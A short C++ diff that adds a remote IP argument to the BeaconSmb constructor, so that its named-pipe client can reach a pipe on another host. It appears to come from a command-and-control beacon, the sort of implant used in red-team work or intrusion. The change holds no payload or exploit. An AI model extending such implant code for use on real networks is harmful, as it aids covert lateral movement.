@@ -4,13 +4,13 @@ using namespace std;
 using namespace PipeHandler;
 
 
-BeaconSmb::BeaconSmb(std::string& config, const std::string& pipeName)
+BeaconSmb::BeaconSmb(std::string& config, const std::string& ip, const std::string& pipeName)
 	: Beacon()
 {
 	// beacon and modules config
     initConfig(config);
 
-	m_clientSmb = new PipeHandler::Client(pipeName);
+	m_clientSmb = new PipeHandler::Client(ip, pipeName);
 }
 
 
